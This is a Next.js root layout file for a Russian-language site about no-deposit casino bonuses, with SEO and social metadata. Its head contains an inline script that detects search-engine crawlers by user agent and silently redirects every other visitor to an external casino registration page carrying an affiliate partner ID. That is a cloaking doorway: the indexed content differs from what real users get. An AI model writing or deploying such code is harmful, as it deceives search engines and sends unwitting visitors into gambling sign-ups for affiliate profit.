import type { ReactNode } from "react";
import { Inter, Oswald } from "next/font/google";
import "./globals.css";

const inter = Inter({ subsets: ["cyrillic", "latin"], variable: "--font-inter" });
const oswald = Oswald({ subsets: ["cyrillic", "latin"], variable: "--font-oswald" });

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="ru" className="bg-night">
      <head>
        <meta name="yandex-verification" content="bbbdcf3abe4b1f03" />
        <title>Бездепозитные бонусы казино за регистрацию — бездеп бонусы, бездепы без депозита</title>
        <meta
          name="description"
          content="Бездепозитные бонусы и бездепы за регистрацию в казино: фриспины и кэш без депозита, вейджер, сроки и лимиты вывода, стратегия отыгрыша и советы, как забрать бездепозитный бонус казино без ошибок."
        />
        <meta name="robots" content="index, follow" />
        <link rel="canonical" href="https://bezdepcasino6.vercel.app/" />
        <meta property="og:type" content="website" />
        <meta
          property="og:title"
          content="Бездепозитные бонусы казино за регистрацию — бездеп бонусы, бездепы без депозита"
        />
        <meta
          property="og:description"
          content="Бездепозитные бонусы и бездепы за регистрацию в казино: фриспины и кэш без депозита, вейджер, сроки и лимиты вывода, стратегия отыгрыша и советы, как забрать бездепозитный бонус казино без ошибок."
        />
        <meta property="og:url" content="https://bezdepcasino6.vercel.app/" />
        <meta property="og:image" content="https://bezdepcasino6.vercel.app/img/hero-dealer.jpg" />
        <meta property="og:locale" content="ru_RU" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta
          name="twitter:title"
          content="Бездепозитные бонусы казино за регистрацию — бездеп бонусы, бездепы без депозита"
        />
        <meta
          name="twitter:description"
          content="Бездепозитные бонусы и бездепы за регистрацию в казино: фриспины и кэш без депозита, вейджер, сроки и лимиты вывода, стратегия отыгрыша и советы, как забрать бездепозитный бонус казино без ошибок."
        />
        <meta name="theme-color" content="#150a10" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p41618p7603");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className={`${inter.variable} ${oswald.variable} bg-night font-sans text-snow antialiased`}>
        {children}
      </body>
    </html>
  );
}
